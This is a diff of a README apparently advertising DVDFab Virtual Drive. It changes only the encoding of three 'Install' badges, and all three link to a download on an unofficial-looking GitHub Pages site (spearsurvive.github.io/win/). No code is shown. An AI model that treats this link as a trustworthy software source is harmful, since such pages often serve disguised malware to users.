@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab%20Virtual%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab+Virtual+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ DVDFab Virtual Drive is a free virtual disc emulation tool that creates virtual 
 
 <div align="center">
 
-[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab%20Virtual%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab+Virtual+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ DVDFab Virtual Drive is a free virtual disc emulation tool that creates virtual 
 
 <div align="center">
 
-[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab%20Virtual%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install DVDFab Virtual Drive](https://img.shields.io/badge/⬇_Install_DVDFab+Virtual+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
